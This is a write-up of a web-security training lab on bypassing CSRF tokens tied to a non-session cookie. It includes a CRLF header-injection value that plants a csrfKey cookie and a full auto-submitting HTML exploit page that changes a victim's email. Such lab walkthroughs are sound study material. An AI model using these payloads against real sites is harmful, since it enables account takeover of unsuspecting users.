# CSRF wher token is tied to non-session cookie
* This lab's email change functionality is vulenrable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.
	* To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
	* You have two accounts on the application that you can use to help design your attack. The credentials are as follows. `wiener:peter` and `carlos:montoya`

### 1. Capture the Wiener's request using Burp's browser
![15](https://user-images.githubusercontent.com/53956303/153682790-067d4e1d-896a-4afb-b87c-e8efa0d90115.png)
* Note the `csrfKey` and `csrf` and drop the request

|parameter|value|
|----|----|
|csrfKey |DgiL54rUPmCtCCnykILNIXHe9K0FC8zV|
|CSRF| 4KkcvhfVDahLWL8XXPmLe5garwzOe14U

### 2. Capture the Carlos's request using Firefox
* Send the reqeust to repeater and replace the `csrfKey` and `csrf` with _wiener's_, and send the request
	* As a result, 302 response is given and the carlos's email is successfully changed.

![image](https://user-images.githubusercontent.com/53956303/153683075-bdd69545-bdfb-48e9-be35-27aa5ab779b3.png)
* It means that the CSRF token is tied to `csrfKey` cookie
### 3. Use the search panel to injet _csrfkey_ cookie into the victim's browser using "search"
* Since the search panel does not have a CSRF token protection, use it to inject `csrfKey`
	* URL ENCODE TO USE IT
```bash
/?search=test
Set-Cookie: csrfKey=DgiL54rUPmCtCCnykILNIXHe9K0FC8zV
```
![17](https://user-images.githubusercontent.com/53956303/153686219-400d71e1-5fa0-4175-96a9-a277515adf67.png)
### 4. Make a malicious HTML using the provided Exploit server
* right click on the cookie injection response to use on the script

![18](https://user-images.githubusercontent.com/53956303/153684745-edb572e7-db96-495d-a294-3362bf49714f.png)
```html
<form method=post action=https://acbb1f0c1e980778c03a4ad500f3006d.web-security-academy.net/my-account/change-email>
    <input type="hidden" name="email" value="usingdifferentCSRF@pwn.com">
    <input type="hidden" name="csrf" value="4KkcvhfVDahLWL8XXPmLe5garwzOe14U">
</form>
<img src="https://acbb1f0c1e980778c03a4ad500f3006d.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=DgiL54rUPmCtCCnykILNIXHe9K0FC8zV" onerror="document.forms[0].submit()">
```

![19](https://user-images.githubusercontent.com/53956303/153684791-bb2e8aa8-715d-4c69-8c94-85cf4fbd81e4.png)
* Store the exploit and deliver the exploit.
	* As a result, the lab is solved

![20](https://user-images.githubusercontent.com/53956303/153684897-aa26e49e-45be-4e82-9d42-9b113aa1db7d.png)
